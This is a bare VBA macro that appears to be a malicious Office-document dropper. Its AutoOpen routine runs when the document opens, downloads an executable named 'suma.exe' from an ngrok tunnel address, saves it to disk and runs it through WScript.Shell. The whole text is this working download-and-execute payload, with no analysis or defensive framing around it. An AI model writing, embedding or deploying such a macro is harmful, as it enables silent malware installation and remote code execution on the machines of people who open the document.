Sub AutoOpen()
Dim http_obj
Dim stream_obj
Dim shell_obj
 
Set http_obj = CreateObject("Microsoft.XMLHTTP")
Set stream_obj = CreateObject("ADODB.Stream")
Set shell_obj = CreateObject("WScript.Shell")
 
URL = "http://b877de48de9a.ngrok.io/example/suma.exe" 'Where to download the file from
FileName = "suma.exe" 'Name to save the file (on the local system)
RUNCMD = "suma.exe" 'Command to run after downloading
 
http_obj.Open "GET", URL, False
http_obj.Send
 
stream_obj.Type = 1
stream_obj.Open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FileName, 2
 
shell_obj.Run RUNCMD
End Sub